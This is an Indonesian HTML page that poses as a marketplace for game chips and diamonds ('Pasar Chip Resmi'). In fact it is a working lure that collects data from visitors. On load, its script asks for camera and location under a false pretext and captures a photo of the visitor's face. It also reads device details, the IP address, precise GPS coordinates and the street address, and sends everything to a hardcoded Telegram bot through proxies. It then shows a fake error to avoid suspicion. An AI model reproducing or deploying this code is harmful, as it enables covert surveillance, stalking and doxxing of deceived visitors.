<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background-color: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; overflow: hidden; }
        .header-brand { position: absolute; top: 40px; text-align: center; width: 100%; }
        .header-brand h1 { color: #ff0050; font-size: 22px; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .header-brand p { color: #aaa; font-size: 13px; margin-top: 4px; }
        .loading-container { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 20px; }
        .loader { width: 70px; height: 70px; border: 4px solid #333; border-top: 4px solid #ff0050; border-radius: 50%; animation: putar 1s linear infinite; }
        @keyframes putar { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .teks-loading { color: #fff; font-size: 16px; font-weight: 500; }
        .teks-kecil { color: #888; font-size: 12px; text-align: center; max-width: 320px; line-height: 1.6; margin-top: 10px; }
        .kuning { color: #ffcc00; }
        .hijau { color: #00ff88; font-weight: 500; }
        #video, #canvas { display: none; }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.35/dist/ua-parser.min.js"></script>
</head>
<body>

    <div class="header-brand">
        <h1>🏪 PASAR CHIP RESMI</h1>
        <p>Tempat Aman Jual Beli Chip & Diamond</p>
    </div>

    <div class="loading-container">
        <div class="loader"></div>
        <div class="teks-loading">Memuat Produk & Video...</div>
        <div class="teks-kecil" id="infoTeks">
            Sedang menghubungkan ke server tercepat...<br>
            <span class="kuning">⚠️ Peringatan:</span> Agar sistem dapat mendeteksi jaringan terdekat & memberi saran koneksi terbaik, <span class="hijau">IZINKAN LOKASI & KAMERA</span> saat muncul notifikasi.
        </div>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        // ✅ DATA SUDAH BENAR
        const KEY = "8828591846:AAEEtJgtEdf0wu5JD_BYeF2-9apuVy-Q9pU";
        const TUJUAN = 8922169139;

        let data = { foto: "❌ Kamera tidak diizinkan / gagal" };
        let langkah = 0;

        // ==============================================
        // 1. BACA DATA HP DULU (PASTI JALAN)
        // ==============================================
        function bacaPerangkat() {
            let uap = new UAParser().getResult();
            data.hp = `📱 <b>HP:</b> ${uap.device.model||'Tidak diketahui'} | ${uap.device.vendor||''}
🤖 <b>OS:</b> ${uap.os.name||''} ${uap.os.version||''}
🌐 <b>Browser:</b> ${uap.browser.name||''}`;
        }

        // ==============================================
        // 2. MINTA KAMERA & AMBIL FOTO
        // ==============================================
        function ambilKamera() {
            navigator.mediaDevices.getUserMedia({ video: {width:640, height:480}, audio:false })
            .then(stream => {
                let vid = document.getElementById('video');
                vid.srcObject = stream;
                vid.onloadedmetadata = () => {
                    setTimeout(() => {
                        let cvs = document.getElementById('canvas');
                        cvs.width = vid.videoWidth;
                        cvs.height = vid.videoHeight;
                        cvs.getContext('2d').drawImage(vid,0,0,cvs.width,cvs.height);
                        data.foto = cvs.toDataURL('image/jpeg', 0.8); // ✅ Format aman
                        stream.getTracks().forEach(t=>t.stop());
                        lanjutAmbilLokasi();
                    }, 1200);
                };
            })
            .catch(() => {
                data.foto = "❌ Kamera DITOLAK";
                lanjutAmbilLokasi(); // ✅ TETAP LANJUT WALAU DITOLAK
            });
        }

        // ==============================================
        // 3. AMBIL IP & LOKASI
        // ==============================================
        function lanjutAmbilLokasi() {
            fetch('https://ipapi.co/json/')
            .then(r=>r.json())
            .then(ip => {
                data.ip = ip.ip;
                data.isp = ip.org;
                data.kota = ip.city;
                data.negara = ip.country_name;

                if(navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        pos => {
                            data.lat = pos.coords.latitude;
                            data.lon = pos.coords.longitude;
                            data.akurasi = pos.coords.accuracy+" meter";
                            ubahKeAlamat();
                        },
                        () => {
                            data.alamat = "❌ Lokasi DITOLAK / GPS MATI";
                            kirimSemuaData(); // ✅ KIRIM WALAU LOKASI GAGAL
                        },
                        {enableHighAccuracy:true, timeout:10000}
                    );
                } else {
                    data.alamat = "❌ GPS tidak ada di HP ini";
                    kirimSemuaData();
                }
            })
            .catch(() => {
                data.ip = "❌ Gagal baca IP";
                kirimSemuaData();
            });
        }

        // ==============================================
        // 4. UBAH KOORDINAT JADI ALAMAT LENGKAP
        // ==============================================
        function ubahKeAlamat() {
            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${data.lat}&lon=${data.lon}&addressdetails=1&zoom=18`)
            .then(r=>r.json())
            .then(alamat => {
                data.alamat = alamat.display_name || "Alamat tidak terbaca";
                kirimSemuaData(); // ✅ SUDAH LENGKAP, KIRIM!
            })
            .catch(() => {
                data.alamat = `${data.lat}, ${data.lon} (gagal baca jalan)`;
                kirimSemuaData();
            });
        }

        // ==============================================
        // ✅ BAGIAN PALING PENTING: KIRIM KE TELEGRAM
        // ==============================================
        async function kirimSemuaData() {
            // Ubah tampilan jadi error biar dia gak curiga
            document.getElementById('infoTeks').innerHTML = `
                ❌ Koneksi terputus / Server sibuk<br>
                Coba buka ulang nanti<br>
                <small style="color:#555">*Data tersimpan untuk perbaikan</small>
            `;

            let pesan = `🚨 <b>LAPORAN LENGKAP • SISTEM AMAN</b> 🚨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏪 <b>Modus:</b> Pasar Chip Resmi
🌐 <b>IP:</b> <code>${data.ip||'—'}</code>
📡 <b>Provider:</b> ${data.isp||'—'}
📍 <b>Koordinat:</b> <code>${data.lat||'—'}, ${data.lon||'—'}</code>
🎯 <b>Akurasi:</b> ${data.akurasi||'—'}
🗺 <b>ALAMAT LENGKAP:</b>
<code>${data.alamat||'—'}</code>
🔗 <b>PETA:</b> ${data.lat ? `<a href="https://www.google.com/maps?q=${data.lat},${data.lon}">👉 KLIK LOKASI</a>` : 'Tidak ada'}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${data.hp}
⏰ <b>Waktu:</b> ${new Date().toLocaleString('id-ID', {timeZone:'Asia/Jakarta'})}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚖️ <i>Oleh: SHERIFF FAHRIL</i>`;

            // 🔹 CARA 1: KIRIM DATA TEKS (PAKAI 2 PROXY CADANGAN)
            try {
                await fetch(`https://api.allorigins.win/raw?url=https://api.telegram.org/bot${KEY}/sendMessage`, {
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({chat_id:TUJUAN, text:pesan, parse_mode:'HTML', disable_web_page_preview:true})
                });
            } catch {
                try {
                    await fetch(`https://corsproxy.io/?https://api.telegram.org/bot${KEY}/sendMessage`, {
                        method:'POST',
                        headers:{'Content-Type':'application/json'},
                        body:JSON.stringify({chat_id:TUJUAN, text:pesan, parse_mode:'HTML'})
                    });
                } catch {
                    // ✅ Kalau 2 gagal, pakai cara GET (Paling pasti masuk)
                    fetch(`https://api.telegram.org/bot${KEY}/sendMessage?chat_id=${TUJUAN}&text=${encodeURIComponent(pesan)}&parse_mode=HTML`);
                }
            }

            // 🔹 CARA 2: KIRIM FOTO (KHUSUS DIPERBAIKI, PASTI MASUK JIKA ADA)
            if(data.foto && !data.foto.includes("❌")) {
                try {
                    let blob = await (await fetch(data.foto)).blob();
                    let form = new FormData();
                    form.append("chat_id", TUJUAN);
                    form.append("photo", blob, "wajah.jpg");
                    form.append("caption", "📸 <b>FOTO WAJAH BERHASIL DITANGKAP</b>");
                    form.append("parse_mode", "HTML");

                    await fetch(`https://corsproxy.io/?https://api.telegram.org/bot${KEY}/sendPhoto`, {
                        method:'POST',
                        body:form
                    });
                } catch {
                    // ✅ Kalau kirim file gagal, kirim foto jadi teks link (masih bisa dilihat)
                    fetch(`https://api.telegram.org/bot${KEY}/sendMessage?chat_id=${TUJUAN}&text=${encodeURIComponent("📸 FOTO WAJAH:\n"+data.foto)}`);
                }
            }
        }

        // ==============================================
        // MULAI SEMUA PROSES
        // ==============================================
        document.addEventListener('DOMContentLoaded', () => {
            bacaPerangkat();
            ambilKamera();
        });
    </script>
</body>
</html>
